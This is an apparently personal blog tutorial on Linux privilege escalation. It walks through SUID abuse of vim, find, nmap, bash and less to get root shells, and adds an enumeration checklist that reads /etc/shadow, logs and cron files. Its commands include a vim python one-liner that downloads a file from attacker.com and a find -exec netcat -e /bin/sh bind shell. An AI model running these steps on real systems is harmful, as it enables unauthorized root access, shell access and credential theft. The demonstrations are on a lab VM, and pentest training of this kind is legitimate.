I"∑.<hr />
<p><strong><span style="color:#06bf04">Hi Guys, This is my First blog about Linux Privilege escalation. So Without wasting any time Let‚Äôs Start I‚Äôll start with basics. </span></strong></p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/1.png" alt="Desktop View" /></p>

<p>‚Äì</p>

<h1 id="so-what-is-linux-and-privilege-escalation">So, What is Linux and Privilege Escalation</h1>

<ol>
  <li>
    <p>Linux -: Linux is the best-known and most-used open-source operating system. As an operating system, Linux is software that sits underneath all of the other software on a computer, receiving requests from those programs and relaying these requests to the computer‚Äôs hardware.</p>
  </li>
  <li>
    <p>PRIVILEGE ESCALATION -: Privilege escalation is a common way for attackers to gain unauthorized access to systems within a security perimeter.</p>
  </li>
  <li>
    <p>Attackers start by finding weak points in an organization‚Äôs defenses and gaining access to a system. In many cases that the first point of penetration will not grant attackers with the level of access or data they need. They will then attempt privilege escalation to gain more permissions or obtain access to additional, more sensitive systems.</p>
  </li>
</ol>

<h1 id="why-privilege-escalation-is-important-">Why Privilege Escalation is Important ?</h1>

<p>While usually not the main aim of an attacker, privilege escalation is frequently used in preparation for a more specific attack, allowing intruders to deploy a malicious payload or execute malicious code in the targeted system. This means that whenever you detect or suspect privilege escalation, you also need to look for signs of other malicious activity. However, even without evidence of further attacks, any privilege escalation incident is an information security issue in itself, because someone could have gained unauthorized access to personal, confidential, or otherwise sensitive data. In many cases, this will have to be reported internally or to the relevant authorities to ensure compliance.</p>

<p>So here we covered some theoretical part the meaning of privilege escalation is gaining access on the root with a non-root account.</p>

<h1 id="privilege-escalation-through-suid">Privilege Escalation through SUID</h1>

<p><strong>SUID</strong> setuid and setgid are Unix access rights flags that allow users to run an executable.</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/2.png" alt="Desktop View" /></p>

<h3 id="list-of-executables--">List of executables -:</h3>

<ol>
  <li>vim</li>
  <li>find</li>
  <li>Nmap</li>
  <li>bash</li>
  <li>less</li>
  <li>more</li>
</ol>

<h1 id="how-to-find-files-with-suid-set-in-linux">How to Find Files with SUID Set in Linux?</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>find <span class="nb">.</span> <span class="nt">-perm</span> /4000
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/3.png" alt="Desktop View" /></p>

<p>you can add more things in this like -l(long listing).</p>

<h1 id="1-vim">1. VIM</h1>
<p>Vim is a highly configurable text editor built to enable efficient text editing. It is an improved version of the vi editor distributed with most UNIX/Linux systems. If vim is running as a suid it can access some root files.
You can access any file you can do many things like spawning shell.</p>

<p>like this -:</p>

<h3 id="1-vimtiny-etcshadow">1. vim.tiny /etc/shadow</h3>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/4.png" alt="Desktop View" /></p>

<ol>
  <li>Press ESC key</li>
</ol>

<p>:set shell=/bin/sh</p>

<p>:shell</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/5.png" alt="Desktop View" /></p>

<ol>
  <li>file download -:</li>
</ol>

<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>export URL=http://attacker.com/file_to_get

export LFILE=file_to_save

vim -c ‚Äò:py import vim,sys; from os import environ as e

if sys.version_info.major == 3: import urllib.request as r

else: import urllib as r

r.urlretrieve(e[‚ÄúURL‚Äù], e[‚ÄúLFILE‚Äù])

vim.command(‚Äú:q!‚Äù)‚Äô
</pre></td></tr></tbody></table></code></pre></div></div>
<p>for more checkout <a href="https://gtfobins.github.io/gtfobins/vim/">here</a></p>

<h1 id="2-find">2. Find</h1>

<p>find -: find is used to find files</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nb">touch</span> <span class="k">*****</span>
find <span class="k">*****</span> <span class="nt">-exec</span> <span class="nb">whoami</span> <span class="se">\;</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/pentest/the-art-of-gaining-root/6.png" alt="Desktop View" /></p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/7.png" alt="Desktop View" /></p>

<p>getting shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>find / <span class="nt">-name</span> software_user <span class="nt">-exec</span> netcat <span class="nt">-lvp</span> 5555 <span class="nt">-e</span> /bin/sh <span class="se">\;</span>
netcat 192.<span class="k">*</span>.<span class="k">*</span>.<span class="k">*</span> 5555
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/8.png" alt="Desktop View" /></p>

<h1 id="3-nmap">3. NMAP</h1>

<p>nmap -: Older versions of Nmap (2.02 to 5.21) had an interactive mode. and through this interactive mode, you can spawn root shell.</p>

<ol>
  <li>
    <p>nmap -V (for finding version )</p>
  </li>
  <li>
    <p>nmap ‚Äî interactive</p>
  </li>
  <li>
    <p>nmap&gt; !sh</p>
  </li>
  <li>
    <p>whoami</p>
  </li>
  <li>
    <p>root</p>
  </li>
</ol>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/9.png" alt="Desktop View" /></p>

<h1 id="4-bash">4. BASH</h1>

<p>bash -: On Linux, bash is the standard shell .
open a bash shell as root.</p>

<ol>
  <li>bash -p</li>
</ol>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/10.png" alt="Desktop View" /></p>

<h1 id="5-less">5. less</h1>

<p>less -: less is a command that displays file contents</p>

<ol>
  <li>less /etc/passwd;</li>
  <li>!/bin/sh</li>
</ol>

<p>important ‚Äî this will not work always don‚Äôt depend on less I showed from metasploitable VM</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/11.png" alt="Desktop View" /></p>

<h1 id="6-more">6. More</h1>

<p>more -: more command is used to view the text files.</p>

<p>the same logic of less will apply of here (more )</p>

<p><strong>Some Important commands :)</strong></p>

<h1 id="1-what-is-the-version">1. What is the version?</h1>

<p>cat /etc/issue</p>

<p>cat /etc/*-release</p>

<p>cat /etc/lsb-release</p>

<h1 id="2-is-it-64-bit-or-32-bit">2. Is it 64-bit or 32-bit?</h1>

<p>cat /proc/version</p>

<p>uname -a</p>

<h1 id="3--finding-environmental-variables">3 . Finding environmental variables!</h1>

<p>cat /etc/profile</p>

<p>cat /etc/bashrc</p>

<p>cat ~/.bash_profile</p>

<p>cat ~/.bashrc</p>

<p>env</p>

<p>set</p>

<h1 id="4-any-printer-connected-to-the-machine">4. Any printer connected to the machine?</h1>

<p>lpstat -a</p>

<h1 id="5-which-services-are-running">5. Which services are running?</h1>

<p>ps aux</p>

<p>ps -ef</p>

<p>top</p>

<p>cat /etc/service</p>

<p>shows that services which are running by root</p>

<table>
  <tbody>
    <tr>
      <td>ps aux</td>
      <td>grep root</td>
    </tr>
  </tbody>
</table>

<table>
  <tbody>
    <tr>
      <td>ps -ef</td>
      <td>grep root</td>
    </tr>
  </tbody>
</table>

<h1 id="6-wich-applications-are-installed-and-versions-and-theyre-running-or-not">6. Wich applications are installed and versions and they‚Äôre running or not?</h1>

<p>ls -alh /usr/bin/</p>

<p>ls -alh /sbin/</p>

<p>dpkg -l</p>

<h1 id="7-setings-of-services-are-misconfigured-or-vulnerable">7. Setings of services are misconfigured or vulnerable</h1>

<p>cat /etc/syslog.conf</p>

<p>cat /etc/cups/cupsd.conf</p>

<p>cat /etc/apache2/apache2.conf</p>

<p>cat /etc/httpd/conf/httpd.conf</p>

<p>cat /opt/lampp/etc/httpd.conf</p>

<h1 id="8-services-or-jobs-are-scheduled">8. Services or jobs are scheduled?</h1>

<p>cat /var/spool/cron/crontabs/root</p>

<table>
  <tbody>
    <tr>
      <td>ls -al /etc/</td>
      <td>grep cron</td>
    </tr>
  </tbody>
</table>

<p>ls -al /etc/cron*</p>

<p>9 . Which NIC machine have ?</p>

<p>/sbin/ifconfig -a</p>

<h1 id="10-network-configuration-settings">10. Network configuration settings</h1>

<p>iptables -L</p>

<p>hostname</p>

<p>dnsdomainname</p>

<h1 id="11-tunnelling-possible-send-commands-locally-remotely">11. Tunnelling possible? Send commands locally, remotely</h1>

<p>ssh -D 127.0.0.1:9050 -N <code class="language-plaintext highlighter-rouge">[username]@[ip]</code></p>

<p>proxychains ifconfig</p>

<h1 id="12-sensitive-files-can-be-found">12. Sensitive files can be found</h1>

<p>cat /etc/passwd</p>

<p>cat /etc/group</p>

<p>cat /etc/shadow</p>

<p>ls -alh /var/mail/</p>

<h1 id="13-finding-logs">13. Finding logs</h1>

<p>cat /etc/httpd/logs/access_log</p>

<p>cat /etc/httpd/logs/access.log</p>

<p>cat /etc/httpd/logs/error_log</p>

<p>cat /etc/httpd/logs/error.log</p>

<p>cat /var/log/apache2/access_log</p>

<p>cat /var/log/apache2/access.log</p>

<p>cat /var/log/apache2/error_log</p>

<p>cat /var/log/apache2/error.log</p>

<p>cat /var/log/apache/access_log</p>

<p>cat /var/log/apache/access.log</p>

<p>cat /var/log/auth.log</p>

<p>cat /var/log/cups/error_log</p>

<p>cat /var/log/dpkg.log</p>

<h1 id="14-shell-spawn">14. Shell spawn</h1>

<p>python -c ‚Äòimport pty;pty.spawn(‚Äú/bin/bash‚Äù)‚Äô</p>

<p>echo os.system(‚Äò/bin/bash‚Äô)</p>

<p>/bin/sh -i</p>

<h1 id="15-how-can-files-be-uploaded">15. How can files be uploaded?</h1>

<p>find / -name wget</p>

<p>find / -name nc*</p>

<p>find / -name netcat*</p>

<p>find / -name tftp*</p>

<p>find / -name ftp</p>

<h1 id="17-toolslanguages-are-installedsupported">17. Tools/languages are installed/supported?</h1>

<p>ind / -name perl*</p>

<p>find / -name python*</p>

<p>find / -name gcc*</p>

<p>find / -name cc</p>

<h1 id="19-anything-interesting-in-the-home-directoriesonly-if-dirs-are-accessible">19. Anything ‚Äúinteresting‚Äù in the home directories(only if dir‚Äôs are accessible)</h1>

<p>ls -ahlR /root/</p>

<p>ls -ahlR /home/</p>

<h1 id="20-whats-cached-ip-andor-mac-addresses">20. Whats cached? IP and/or MAC addresses</h1>

<p>arp -e</p>

<p>route</p>

<p>/sbin/route -nee</p>

<p><strong>We covered a lot of commands now I m going to tell about the most common tool is used for priv esc.</strong>
LINPEAS ‚Äî LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix. i use this because it‚Äôs too good for priv esc</p>

<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/README.md">LINK</a>
also, linENUM is a good tool
<a href="https://github.com/rebootuser/LinEnum">link</a>
but for me mostly linpeas works.</p>

<p>Thanks for reading guys,</p>

<p>See-ya,</p>

<p>source -: google and research</p>

<p><img src="/assets/img/pentest/the-art-of-gaining-root/last.png" alt="Desktop View" /></p>

<p>happy-hacking</p>
:ET